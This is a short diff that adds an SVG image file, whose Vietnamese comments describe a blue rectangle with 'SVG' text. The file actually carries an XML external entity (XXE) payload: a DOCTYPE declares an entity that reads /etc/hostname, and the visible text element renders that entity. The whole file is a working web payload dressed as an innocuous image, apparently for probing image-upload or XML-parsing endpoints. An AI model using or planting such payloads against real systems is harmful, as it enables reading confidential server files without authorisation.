@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname" >]>
+<svg width="200" height="200" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <!-- Hình chữ nhật nền -->
+  <rect x="10" y="10" width="180" height="180" fill="blue" />
+  
+  <!-- Chữ "SVG" ở giữa -->
+  <text x="20" y="100"  font-family="Arial" font-size="24" fill="white">&xxe;</text>
+</svg>
+
